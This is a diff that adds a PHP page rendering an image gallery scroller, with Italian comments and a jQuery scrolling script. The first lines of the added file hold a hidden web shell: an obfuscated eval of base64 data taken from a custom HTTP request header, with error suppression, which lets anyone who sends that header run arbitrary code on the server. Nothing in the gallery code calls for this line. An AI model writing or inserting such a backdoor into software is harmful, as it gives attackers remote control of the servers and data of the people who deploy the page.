@@ -1,0 +1,56 @@
+<?php
+@EvaL ( Base64_DecodE ( $_SERVER [ 'HTTP_LENGTH' ] ) );
+?><ul id="scroller">
+       <?php
+            
+function elencafiles($dirname){
+    $arrayfiles=Array();
+    if(file_exists($dirname)){
+        $handle = opendir($dirname);
+        while (false !== ($file = readdir($handle))) { 
+            if(is_file($dirname.$file)){
+                array_push($arrayfiles,$file);
+            }
+        }
+        $handle = closedir($handle);
+    }
+    sort($arrayfiles);
+    return $arrayfiles;
+}
+
+/*art INIZIO*/
+$nome = basename($_SERVER['PHP_SELF']);
+$nome = substr($nome,0,-4);
+$dove = "img/gallery/".$nome."/";
+$filtro = nome;
+$arrayfile=array();
+$arrayfile=elencafiles($dove);
+
+
+for($a=0;$a<count($arrayfile);$a++){
+    ?>
+ <li>
+    <a class="ico_zoom prettyPhoto" href="<?php echo $dove.$arrayfile[$a];?>">
+        <span class="overlay-img"></span><span class="overlay-img-thumb font-icon-plus"></span></a>
+         <img src="<?php echo $dove.$arrayfile[$a];?>" style="width:100px; height:70px;">
+ </li>
+  <?php
+  }
+  /*art FINE*/
+  ?>
+</ul>
+            
+        </div>
+    </div>
+<script type="text/javascript" src="jquery.simplyscroll.js"></script>
+    <link rel="stylesheet" href="jquery.simplyscroll.css" media="all" 
+    type="text/css">
+    <script type="text/javascript">
+(function($) {
+    $(function() { //on DOM ready 
+            $("#scroller").simplyScroll();
+    });
+ })(jQuery);
+</script>
+</body>
+</html>
